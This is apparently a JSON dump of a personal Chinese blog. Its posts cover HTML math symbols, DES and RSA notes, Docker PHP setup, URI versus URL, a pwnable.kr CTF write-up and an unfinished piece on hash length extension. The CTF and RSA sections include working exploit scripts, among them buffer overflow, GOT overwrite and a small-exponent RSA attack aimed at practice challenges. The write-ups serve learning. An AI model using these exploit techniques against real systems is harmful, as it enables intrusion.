[{"title":"利用 HTML 在 Markdown 中打出数学符号","date":"2018-03-28T04:03:56.000Z","path":"2018/03/28/markdown-tip/","text":"想要打出奇奇怪怪的符号。 1. 上标n2=n+1 n&lt;sup&gt;2&lt;/sup&gt;=n+1 2. 下标a=log2b a=log&lt;sub&gt;2&lt;/sub&gt;b 3. 注册商标hexo &reg; hexo &amp;reg; 4. function 符号&fnof;(x)=x+1 &amp;fnof;(x)=x+1 5. 根号&radic;2 （感觉不是很好看） &amp;radic;2 6. 角度符号30&deg; 30&amp;deg; 7. 一点小工作整理了一些比较常用的特殊符号的 HTML 编码： 符号 说明 编码 &times; 乘号 &amp;times; &divide; 除号 &amp;divide; &larr; 向左箭头 &amp;larr; &rarr; 向右箭头 &amp;rarr; &uarr; 向上箭头 &amp;uarr; &darr; 向下箭头 &amp;darr; &harr; 双向箭头 &amp;harr; &lArr; 双线向左箭头 &amp;lArr; &rArr; 双线向右箭头 &amp;rArr; &hArr; 双线双向箭头 &amp;hArr; &nbsp; 空格 &amp;nbsp; &plusmn; 正负符号 &amp;plusmn; &infin; 无限大符号 &amp;infin; &ang; 角度符号 &amp;ang; &int; 微积分符号 &amp;int; &iquest; 倒问号 &amp;iquest; &ne; 不等于符号 &amp;ne; &equiv; 相等符号 &amp;equiv; &le; 小于等于符号 &amp;le; &ge; 大于等于符号 &amp;ge; &para; 段落符号 &amp;para; &sect; 章节符号 &amp;sect; &perp; 垂直符号 &amp;perp; &copy; 版权所有符号 &amp;copy; &trade; 商标符号 &amp;trade; &reg; 注册商标符号 &amp;reg; &frac12; 二分之一符号 &amp;frac12; &permil; 百分符号 &amp;permil; &there4; 所以符号 &amp;there4; &pi; 圆周率符号 &amp;pi; &alpha; Alpha 符号 &amp;alpha; &beta; Bata 符号 &amp;beta; &gamma; Gamma 符号 &amp;gamma; &Delta; Delta 符号 &amp;Delta; &theta; Theta 符号 &amp;theta; &lambda; Lambda 符号 &amp;lambda; &Sigma; Sigma 符号 &amp;Sigma; &tau; Tau 符号 &amp;tau; 再记录一个异或符号：⊕ 参考文章： 如何在markdown中打出上标、下标和一些特殊符号","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://iCyris.github.io/tags/Notebook/"}]},{"title":"密码学笔记","date":"2018-03-28T03:14:38.000Z","path":"2018/03/28/密码学笔记/","text":"长期更新一些密码学相关的知识点。 一、流密码序列密码也称为流密码（Stream Cipher），它是对称密码算法的一种。 TODO 二、数据加密标准 DESDES 算法为密码体制中的对称密码体制，又被称为美国数据加密标准。 DES 是一个分组加密算法，分组长度为 64 比特，其中有 8 位（第8、16、24、32、40、48、56、64位）是奇偶校验位，因此实际长度为 56 比特。因为它使用的 56 位密钥过短，现已被 AES 替代。 一张图解释 DES ，图片转自这里： 2.1 流程概览64 位明文 –&gt; 初始置换 IP（用于重排明文分组）–&gt; 16 轮加密变换 –&gt; 逆初始置换 IP-1 –&gt; 密文 2.2 初始置换 IPIP 置换是为了将输入的 64 位数据块按位重新组合，并输出为 L0 ，R0 两部分，两部分均长 32 位。 置换规则如下： 58 50 42 34 26 18 10 260 52 44 36 28 20 12 462 54 46 38 30 22 14 664 56 48 40 32 24 16 857 49 41 33 25 17 &nbsp;9 &nbsp;&nbsp;159 51 43 35 27 19 11 361 53 45 37 29 21 13 563 55 47 39 31 23 15 7 置换规则表中数字的意义为：比如第一个数字是 58 ，表示将第 58 个比特换到第 1 个比特的位置，接下来把第 50 比特换到第 2 个比特的位置，以此类推。 置换后的数据分为左 32 位（L0）与右 32 位（R0）。表中上面四行（从 58 - 8 ）数据为 L0 ，下面四行（从 57 - 7 ）数据为 R0 。这张表还是有一定规律的，比如 L0 部分均为偶数，且按从上到下，从右到左的方式看，数据按 2 ，4 ，6，8… 这样的规律排列。 2.3 密钥调度初始置换完成后就要进行 16 轮加密变换了，首先需要进行密钥调度，这是一个用来产生子密钥的算法。 该运算由三个部分组成：拣选变换 PC-1 ，PC-2 ，循环左移变换 LS 。 1). PC-1拣选变换 PC-1 表示从 64 比特中选出 56 比特的比特串，并适当调整比特次序。拣选方法见下图： 它表示选择第 57 比特放到第 1 个比特位置，选择第 49 比特放到第 2 个比特位置等等。注意表中没有 8，16，24，32，40，48，56 和 64 这 8 位，因为每个字节的第 8 位用来作为奇偶校验位了。 2). LS 与 PC-2在接下来的 16 轮加密中，每轮都从刚刚得到的 56 位密钥中拣选出不同的 48 位子密钥，确定这些子密钥的方式为： 1). 将 56 位的密钥分为两个半密钥，每部分 28 位。2). 根据轮数，将这两部分分别循环左移（指位置上的移动） 1 位或 2 位，每轮移动的位数如下表所示： 3). 移动完成后，将两个半密钥进行拼接，然后进行第二次拣选（PC-2），拣选规则如下图所示，使用方法同 PC-1 （注意表中没有 9，18，22，25，35，38，43 和 54这 8 位）： 解密与加密运算相似，但子密钥的使用次序与加密变换相反。 2.4 十六轮加密每次加密对半块（32位）进行操作，并包括四个步骤： 扩展变换 E — 用扩展置换（图中的 E ）将 32 位的半块扩展到48位，其输出包括 8 个 6 位的块，每块包含 4 位对应的输入位，加上两个邻接的块中紧邻的位。 与密钥混合 — 用异或操作将扩展的结果和一个子密钥进行混合。一共有 16 个 48 位的子密钥，每个用于一个回次的 F 变换，密钥生成方式上面已经介绍过啦。 S 盒置换 — 在与子密钥混合之后，块被分成 8 个 6 位的块，然后使用“ S 盒”，或称“置换盒”进行处理。8 个 S 盒的每一个都使用以查找表方式提供的非线性的变换将它的 6 个输入位变成 4 个输出位。S 盒提供了 DES 的核心安全性，如果没有 S 盒，密码会是线性的，很容易破解。 P 盒置换 — 最后，S 盒的 32 个输出位利用固定的置换，“ P 盒置换”进行重组。这个设计是为了将每个 S 盒的 4 位输出在下一回次的扩张后，使用 4 个不同的 S 盒进行处理。 下面分别说明一下这四个过程。 1). 扩展变换 E扩展变换的对象是 IP 置换后获得的右半部分 R0，将 32 位输入扩展为 48 位（6 位 × 8 组）输出。 扩展置换目的有两个：生成与密钥长度相同的数据以进行异或运算；提供更长的结果，在后续的替代运算中可以进行压缩。 扩展变换原理如下表： 表中数字同样代表位，黄色的数字表示扩展的数据，变换过程也很简单，举个简单的例子： 输入数据：A = 0x10811001转换为二进制数据：A_bin = 0001 0000 1000 0001B 按照上表进行扩展后得到： 2). 与密钥混合扩展置换之后，右半部分数据 R0 变为 48 位，与密钥置换得到的轮密钥进行异或。 3). S 盒置换压缩后的密钥与扩展分组异或以后得到 48 位的数据，将这个数据送入 S 盒，进行替代运算。替代由 8 个不同的 S 盒完成，每个 S 盒有 6 位输入，4 位输出。48 位输入分为 8 个 6 位的分组，一个分组对应一个 S 盒，对应的 S 盒对各组进行代替操作。 一个 S 盒就是一个 4 行 16 列的表，盒中的每一项都是一个 4 位的二进制数。S 盒的 6 个输入确定了其对应的输出在哪一行哪一列，输入的高低两位作为行数 H ，中间四位做为列数 L ，在 S-BOX 中查找第 H 行 L 列对应的数据(&lt;32)。 8 个盒子的图就不放了，网上有很多，举一个操作的例子吧。 例如，假设一个 S 盒的输入为 110011 ，第 1 位和第 6 位组合为 11，对应于 S 盒 8 的第 3 行；第 2 位到第 5 位为1001，对应于这个 S 盒 的第 9 列。假设这个 S 盒的第 3 行第 9 列的数字为 12 ，则用 1100 来代替 110011 。注意，S 盒的行列计数都是从 0 开始的。 代替过程产生 8 个 4 位的分组，组合在一起形成 32 位数据。 S 盒代替是 DES 算法的关键步骤，所有的其他的运算都是线性的，易于分析，而 S 盒是非线性的，相比于其他步骤，提供了更好安全性。 4). P 盒置换S 盒代替运算的 32 位输出按照 P 盒进行置换。该置换把输入的每位映射到输出位，任何一位不能被映射两次，也不能被略去，映射规则如下表： 最后，P 盒置换的结果与最初的64位分组左半部分 L0 异或，然后左、右半部分交换，接着开始另一轮。 轮变换的过程写成公式的话是这样： Li = Ri-1Ri = Li-1 ⊕ F (Ri-1, Ki) 2.5 IP-1 末置换末置换是初始置换的逆过程，DES 最后一轮后，左、右两半部分并未进行交换，而是两部分合并形成一个分组做为末置换的输入。 假装放了置换规则。 置换方法同上，也不说了。 2.6 Python 实现加解密脚本： # -*- coding:utf-8 -*- from pyDes import * def hexString2bytes(src): ret =[] for i in range(len(src)/2): hd = int(src[i*2:i*2+1],16) ld = int(src[i*2+1:i*2+2],16) fd = (hd*16+ld)&amp;0xff ret.append(fd) return ret def byte2hexString(byte_arr): ret=&#39;&#39; for i in range(len(byte_arr)): hx = hex(ord(byte_arr[i]))[2:] if len(hx)==1: hx=&#39;0&#39;+hx ret+=hx.upper() return ret def des_ecb_decrypt(source, key): source = hexString2bytes(source) source = [chr(x) for x in source] des_obj = des(key.encode(&#39;utf-8&#39;), ECB, IV=None, pad=None, padmode=PAD_PKCS5) des_result = des_obj.decrypt(source) return des_result def des_ecb_encode(source, key): des_obj = des(key.encode(&#39;utf-8&#39;), ECB, IV=None, pad=None, padmode=PAD_PKCS5) source = [chr(ord(x)) for x in source] des_result = des_obj.encrypt(source) return byte2hexString(des_result) if __name__==&#39;__main__&#39;: src=&#39;encrypt me&#39; key=&quot;12345678&quot;; encrypted = des_ecb_encode(src, key) print &#39;encrypted: &#39;, encrypted print &#39;decrypted: &#39;, des_ecb_decrypt(encrypted, key) 参考文章： 安全体系（一）—— DES算法详解维基百科 三、高级加密标准 AESTODO 四、哈希函数MD5TODO SHA-1TODO 五、RSA5.1 加密原理5.2 攻击手段1). 小明文攻击e 为 3 时会产生小明文攻击。 一个简单的例子，题目给出的信息如下： N：179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211 E：3 C：826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581L flag? exp: # !/usr/bin/python # coding=utf-8 import gmpy import libnum N = 179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639477074095512480796227391561801824887394139579933613278628104952355769470429079061808809522886423955917442317693387325171135071792698344550223571732405562649211 C = 826315331619023570333927368402415746375121931530175503997253550521249603484788863000488498971763172906490538445007322279725379352003051009132296583666591835676940471026344712455146169609370787877307086577742407351355619892014203721206411825379081930406716230574277137708287779956941012581L k=0; while True: (x,y)=gmpy.root(C+k*N,3) if(y==1): print &quot;flag: &quot; + libnum.n2s(x); break; k+=1 # flag: pwnhub{f233dd92e8c379983d394ccd7c26122c} 六、CBCTODO","tags":[{"name":"CRYPTO","slug":"CRYPTO","permalink":"https://iCyris.github.io/tags/CRYPTO/"}]},{"title":"利用 Dokcer 部署 PHP 开发环境","date":"2018-03-19T06:28:15.000Z","path":"2018/03/19/docker-php/","text":"利用 Docker 手动配置 PHP + Njinx + MySQL 开发环境。 手动配置的方法为：先拉取一个 ubuntu 镜像并创建相应的容器，在容器内部进行 PHP 相关环境部署。关于 docker 的说明以及具体的安装的方法请参考官方文档。 1. 安装 docker如果是在服务器端（以 ubuntu 为例），安装 docker 的基础操作有： sudo apt-get install -y docker.io #安装docker service docker start #启动docker service docker stop #关闭docker 简单说一下 image 与 container 的区别。前者为镜像，后者为容器，容器基于镜像，而我们平时用的 docker run 命令是从已有镜像中开启一个新的容器。 2. 拉取镜像docker 成功运行以后： sudo docker pull ubuntu #不指定版本，直接拉取一个 ubuntu 最新的 image ，如需指定版本可以用 ubuntu:16.04 的方式。 3. 创建测试容器现在我们已经有了一个 ubuntu 的镜像，接下来创建测试容器： sudo docker images #查看所有镜像 sudo docker run -i -t --name=&quot;my_ubuntu&quot; image_id /bin/bash # 创建一个新的容器并运行，如果需要映射端口可以加上 -p 参数（如 -p 8083:80 ，前者为主机端口，后者为容器端口）。 # -i: 以交互模式运行容器，通常与 -t 同时使用； # -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； # --name=&quot;my_ubuntu&quot;: 为容器指定一个名称； sudo docker ps #查看正在运行的容器 另外，当我们 exit 一个容器时，因为没有加 -d 参数，所以容器也会 stop ，如果需要再次进入可以先启动容器： docker start container_id 然后有两种方法重新进入交互状态，docker attach 与 docker exec -it 。用前者进入 container 时如果退出了容器，它依然会 stop ，而用后面的方式进入容器即使退出了交互界面 container 仍然会在后台运行。完整命令如下： docker exec -it container_id /bin/bash 4. 环境搭建现在我们已经进入了一个容器中，下面安装 PHP + Nginx + MySQL 的环境： apt-get update apt-get install nginx apt-get install mysql-server apt-get install php 为了方便测试可以自行 apt-get install net-tools, vim, curl, unzip 等工具。 5. 传输写好的代码如果想要传输写好的代码到服务器上或者到 docker 中，有几条命令： 传输到服务器上（最好先打包为 zip ）： scp local_file remote_username@remote_ip:remote_path 传入 docker 容器中： 将主机 /www/runoob 目录拷贝到容器 96f7f14e99ab 的 /www 目录下： docker cp /www/runoob 96f7f14e99ab:/www/ 将主机 /www/runoob 目录拷贝到容器 96f7f14e99ab 中，目录重命名为 www ： docker cp /www/runoob 96f7f14e99ab:/www 将容器 96f7f14e99ab 的 /www 目录拷贝到主机的 /tmp 目录中： docker cp 96f7f14e99ab:/www /tmp/ 我们将代码解压至容器中 /var/www/html/ 目录下，但此时访问 php 会直接弹出下载而非解析，需要修改下 nginx 的配置文件，进入 /etc/nginx/sites-enabled/default ，修改 php 部分为： location ~ \\.php$ { fastcgi_pass unix:/run/php/php7.0-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; include fastcgi_params; } 重启下 nginx 就可以解析 php 了，其他的配置网上已经有很多的教程，这里就不多说了。 6. 几条服务重启命令/etc/init.d/mysql restart /etc/init.d/nginx restart /etc/init.d/php7.0-fpm restart 参考文章： 从零学习Docker部署环境","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://iCyris.github.io/tags/Notebook/"}]},{"title":"小谈 URI、URL 与 URN","date":"2018-03-18T08:37:08.000Z","path":"2018/03/18/url-talk/","text":"Talk about URL. 🐥 0x00 引言小科普帖。 我们一般对 URL 比较熟悉，但很少了解 URI 与 URN ，以及这三者之间的关系，先放一张它们的关系图： 0x01 概念三个名词的定义： URI (Uniform Resource Identifier) : 统一资源标识符。是一个用于标识某一互联网资源名称的字符串。 该种标识允许用户对网络中（一般指万维网）的资源通过特定的协议进行交互操作。 URL (Uniform Resource Locator) : 统一资源定位符（或称统一资源定位器/定位地址、URL 地址等）。有时也被俗称为网页地址（网址）。如同在网络上的门牌，是因特网上标准的资源的地址（Address）。 URN (Uniform Resource Name) : 统一资源名称，是统一资源标识（URI）的历史名字，它使用 urn: 作为 URI scheme。 简单地说，URI 可被视为定位符（URL），名称（URN）或两者兼备。 统一资源名（URN）如同一个人的名称，而统一资源定位符（URL）代表一个人的住址。换言之，URN 定义某事物的身份，而 URL 提供查找该事物的方法。如果觉得这样说有点绕，那我们来看看如何用一句话区分 URL 与 URI。 0x02 一句话区分 URL 与 URIURL 是 URI 的子集。 任何东西只要能够唯一地标识出来，都可以说这个标识是 URI 。如果这个标识还能获取到上述对象的路径，那么它同时还可以是一个 URL 。但是如果它不能提供获取到对象的路径，那么它必然不是 URL 。 即 URI 与 URL 都定义了 what the resource is，而 URL 还要包含 where (the resource is) 与 how (to get the resource) 。 0x03 栗子栗子比如现在有一个网站：https://cyris.cn/dir/filename.html 。 其中 dir/filename.html 就是一个 URI ，而整个链接就是一个 URL ，它包含了指定什么协议（https），在哪个站点（cyris.cn），去获取什么资源（dir/filename.html）。 正如上面所说，URI 只要是能唯一标识资源即可，而 URL 包括了 where，how，what 三者。","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://iCyris.github.io/tags/Notebook/"}]},{"title":"pwnable.kr writeup","date":"2018-03-12T06:25:28.000Z","path":"2018/03/12/pwnable-kr/","text":"开始学习 pwn 。 网址：http://pwnable.kr [Toddler’s Bottle]fd Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU ssh fd@pwnable.kr -p2222 (pw:guest) 给出了源码 : #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } 查询一下 file descriptor ： Integer value Name symbolic constant file stream 0 Standard input STDIN_FILENO stdin 1 Standard output STDOUT_FILENO stdout 2 error STDERR_FILENO stderr 标准 io 中，read 函数的第一个参数需要为 0 （即标准输入），0x1234 转换为十进制为 4660 ，另外 buf 需要等于 “LETMEWIN\\n” ，poc 如下： from pwn import * pwn_ssh = ssh(host = &#39;pwnable.kr&#39;, user = &#39;fd&#39;, password = &#39;guest&#39;, port = 2222) print (pwn_ssh.connected()) sh = pwn_ssh.process(argv = [&#39;fd&#39;,&#39;4660&#39;], executable = &#39;./fd&#39;) sh.sendline(&quot;LETMEWIN&quot;) print (sh.recvall()) mommy! I think I know what a file descriptor is!! collision Daddy told me about cool MD5 hash collision today.I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) 同样给出了源码： #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0; } check_password 函数把传入的数组中的数据（char 类型）转换为 int 类型后求和，总共有 5 个数，而一个 int 占四个字节，长度刚好为 20 bytes ，满足要求。 接着构造需要传入的数据。要使结果等于 0x21DD09EC ，可以先将 (568134124+1) / 5 = 113626825 。前四组数据为 113626825，第五组需要减个 1（即 113626824）。转换一下类型就是 ‘0x6c5cec9’ * 4 + ‘0x6c5cec8’ ，即 ‘\\x06\\xc5\\xce\\xc9’ * 4 + ‘\\x06\\xc5\\xce\\xc8’。 因为目标服务器使用的是小端序存储，最后需要把传入的字符反一下： ./col `python -c &quot;print &#39;\\xc9\\xce\\xc5\\x06&#39; * 4 + &#39;\\xc8\\xce\\xc5\\x06&#39;&quot;` poc: from pwn import * pwn_ssh = ssh(host = &#39;pwnable.kr&#39;, user = &#39;col&#39;, password = &#39;guest&#39;, port = 2222) print (pwn_ssh.connected()) data = &#39;\\xc9\\xce\\xc5\\x06&#39; * 4 + &#39;\\xc8\\xce\\xc5\\x06&#39; sh = pwn_ssh.process(argv = [&#39;col&#39;, data], executable = &#39;./col&#39;) print (sh.recvall()) daddy! I just managed to create a hash collision :) bof Nana told me that buffer overflow is one of the most common software vulnerability.Is that true? Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 bof.c : #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } 一道关于缓冲区溢出的题，需要通过 overflow 来覆盖 key 的值。 ida 载入后进入 func 函数： 可以找到 a1 的地址为 ebp+8h ，s 的地址为 ebp-2Ch，距离差 52，所以要覆盖 52 个字符。 (python -c &quot;print &#39;A&#39;*52 + &#39;\\xbe\\xba\\xfe\\xca&#39;&quot;; cat) | nc pwnable.kr 9000 # 同样需要注意后面的字符需要倒序传入；另外这里的 cat 既能让 nc 的 tcp 会话不结束（直到用户输入 Ctrl+C），又可以将用户输入的内容重定向给 nc。 exp: from pwn import * pwn_socket = remote(&#39;pwnable.kr&#39;, 9000) pwn_socket.sendline(&#39;A&#39; * 52 + &#39;\\xbe\\xba\\xfe\\xca&#39;) pwn_socket.interactive() daddy, I just pwned a buFFer :) flag Papa brought me a packed present! let’s open it. Download : http://pwnable.kr/bin/flag This is reversing task. all you need is binary ida 载入后发现字符串：”This file is packed with the UPX”，那就用 upx 去解密 elf。 首先安装 upx : sudo apt-get install upx-ucl 之后执行命令解压 : upx -d flag 重新用 ida 载入后找到 flag ： .rodata:0000000000496628 aUpxSoundsLikeA db &#39;UPX...? sounds like a delivery service :)&#39;,0 .rodata:0000000000496628 ; DATA XREF: .data:flag↓o UPX...? sounds like a delivery service :) passcode Mommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) 源代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\\n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0; } login() 中两个 scanf 都没有取地址，这会导致程序使用两个 passcode 的值作为存储输入的地址，如果地址不可写就会造成程序内部错误。 这样就不能直接写入特定的 passcode 值了，思路是 GOT 表覆写。 由于 welcome() 和 login() 函数是连续调用的，导致它们有相同的地址，从下面这两段代码中也可以看出，它们都在 esp+18h 的位置： unsigned int welcome() { char v1; // [esp+18h] [ebp-70h] unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(&quot;enter you name : &quot;); __isoc99_scanf(&quot;%100s&quot;, &amp;v1); printf(&quot;Welcome %s!\\n&quot;, &amp;v1); return __readgsdword(0x14u) ^ v2; } int login() { int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(&quot;enter passcode1 : &quot;); __isoc99_scanf(&quot;%d&quot;); fflush(stdin); printf(&quot;enter passcode2 : &quot;); __isoc99_scanf(&quot;%d&quot;); puts(&quot;checking...&quot;); if ( v1 != 338150 || v2 != 13371337 ) { puts(&quot;Login Failed!&quot;); exit(0); } puts(&quot;Login OK!&quot;); return system(&quot;/bin/cat flag&quot;); } 这样 name 和 passcode1 就存在于相同的栈空间了。name 的地址为 ebp-70h ，passcode1 的地址为 ebp-10h ，两者相距 96 个字节，有 4 个字节的任意地址写。我们可以把 passcode1 覆盖为 fflush 的地址，然后利用 scanf 把 system 的地址写过去，这样等执行 fflush 时就能执行 system 了（即把 fflush 的 GOT 表值改为 080485E3 ）。 system 的地址： .text:080485E3 mov dword ptr [esp], offset command ; &quot;/bin/cat flag&quot; .text:080485EA call _system poc: from pwn import * context.log_level = &#39;debug&#39; context.terminal = [&#39;terminator&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;] bin = ELF(&#39;./passcode&#39;) cn = ssh(host=&#39;pwnable.kr&#39;, user=&#39;passcode&#39;, password=&#39;guest&#39;, port=2222).process(&quot;./passcode&quot;) cn.recv() cn.sendline(&#39;a&#39;*96 + p32(bin.got[&#39;fflush&#39;])) cn.recv() cn.sendline(str(0x080485E3)) print cn.recv() 再记录两条命令： objdump -d passcode readelf -r passcode Sorry mom.. I got confused about scanf usage :(","tags":[{"name":"CTF","slug":"CTF","permalink":"https://iCyris.github.io/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"https://iCyris.github.io/tags/PWN/"}]},{"title":"哈希长度扩展攻击","date":"2018-02-02T09:00:58.000Z","path":"2018/02/02/hash-extender-attack/","text":"哈希长度扩展攻击利用了 MD5 ，SHA1 等加密算法的缺陷，可以在不知道原始密钥的情况下计算出一个对应的 hash 值。 0x00 引言做题的时候看到了这个问题，挺好玩的，记录一下。 题目中的代码： &lt;?php $auth = false; $role = &quot;guest&quot;; $salt = ; if (isset($_COOKIE[&quot;role&quot;])) { $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) { $auth = true; } else { $auth = false; } else {} $s = serialize($role); setcookie(&#39;role&#39;,$s); $hsh = md5($salt.strrev($s)); setcookie(&#39;hsh&#39;,$hsh); } if ($auth) { echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot; } else { echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;; } ?&gt; 一篇不错的文章：https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks 0x01 简单了解hash函数哈希函数以区块为单位操作数据。诸如MD5, SHA1, SHA256的区块长度都是512 bits 。大多数 message 的长度不会刚好可以被哈希函数的区块长度整除。因此 message 就必须被填充（ padding ）至区块长度的整数倍。 这里简单说一下MD5的加密原理，详细的描述可以参考 RFC1321 MD5是输入不定长度信息，输出固定长度128-bits的算法。即使原文中出现一个微小的变化，其散列结果也会发生巨大变化。空文的散列为： MD5(&quot;&quot;) = d41d8cd98f00b204e9800998ecf8427e MD5算法包括几个步骤：1. 补位；2. 补长度；3. 初始化MD缓冲区；4. 处理字块消息。它以512bit为一个块进行迭代运算，第一个块计算完成后四个寄存器的值就会更新，如果还存在下一个块，就在此基础上继续进行迭代计算，全部完成后，把四个寄存器中的十六进制连接起来，就是最后的md5值。简单讲一下这几个步骤： 1 - 补位如果当前的数据长度不满足对 512bit 求余为 448bit ，即len(message) % 512 != 448时，需要补位至满足这个条件。补位方式： 首先补一个1（二进制位上的1，而非十进制位上的） 在后面补0（也是二进制位上的），直到满足条件（数据比特长度对 512 求余为 448） 注意，如果消息长度已经达到 448bit ，也要进行补位，补位是必须的。 2 - 补长度即补 64bit 的长度，这个长度是在补 1 和 0 以前的长度，如果长度超出了 64bit，那么就取低 64bit。 引用一下lightless文章里的说法。完成补位与补长度的操作后，一个块可能是这个样子的： raw_data + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; 第一个 raw_data 的部分就是原始的数据，第二个部分’\\x80’是一开始补的一个二进制位 1，接着补若干个 \\ x00，直到整个长度达到 56Byte，最后的 8Byte 就是 raw_data 的长度，如果 raw_data 的长度超过了 2^64bit，则取低 64bit. 附1，2步的文档介绍 Step 1. Append Padding Bits The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512. That is, the message is extended so that it is just 64 bits shy of being a multiple of 512 bits long. Padding is always performed, even if the length of the message is already congruent to 448, modulo 512. Padding is performed as follows: a single “1” bit is appended to the message, and then “0” bits are appended so that the length in bits of the padded message becomes congruent to 448, modulo 512. In all, at least one bit and at most 512 bits are appended. Step 2. Append Length A 64-bit representation of b (the length of the message before the padding bits were added) is appended to the result of the previous step. In the unlikely event that b is greater than 2^64, then only the low-order 64 bits of b are used. (These bits are appended as two 32-bit words and appended low-order word first in accordance with the previous conventions.) At this point the resulting message (after padding with bits and with b) has a length that is an exact multiple of 512 bits. Equivalently, this message has a length that is an exact multiple of 16 (32-bit) words. Let M[0 … N-1] denote the words of the resulting message, where N is a multiple of 16. 3 - 初始化MD缓冲区在计算md5的时候会先初始化四个寄存器（A，B，C，D）且有各自的初始值： word A: 01 23 45 67 word B: 89 ab cd ef word C: fe dc ba 98 word D: 76 54 32 10 4 - 处理字块消息必须用已经完成补位 &amp; 补长度操作的字块来进行运算，具体细节不展开了，我们只需要知道经过一次消息摘要后，上面的寄存器值将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。 举个栗子🌰 假设待加密的字符串为 abc 把字符串转化为16进制形式 - 616263 补位。即在二进制形式的信息后面先添一个 1 ，然后接若干个 0 直到满足 len(message) % 512 == 448 这一条件。16进制下我们在 616263 后加一个 80 （即二进制的 10000000 ），把它按照规则补位到 448 bit ，也就是56字节。 补长度。完成补位后，第 57 个字节存储的是补位之前信息的长度。原来的信息为 abc ，3个字符，3个字节，24 bit，换成16进制后为 0x18 ，其后补充7个 0x00 以补满 64 字节。 利用完成前几步补足操作的数据进行复杂运算。取出 64 字节信息，第一轮运算中使用的链变量为初始链变量，之后每一次运算链变量都会被覆盖更新，最后一轮运算产生的链变量经过高低位互换后就是我们得到的 MD5 值。 0x02 哈希长度扩展攻击MD5的补位操作正是实现长度扩展攻击的关键。 我们虽然不知道具体的 salt 值，但如果我们得到了其 hash 值以及一个可控的信息，我们就可以利用这些点进行哈希长度扩展攻击。我们得到的 hash 值正是最后一轮运算产生的链变量经过高低位互换后得到的结果，如果我们要把可控的信息进行下一轮运算，只需要知道上一轮信息产生的链变量。 回到开头贴的那份代码，关键语句为 if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) { $auth = true; } 简单说一下思路：我们可以从 cookie 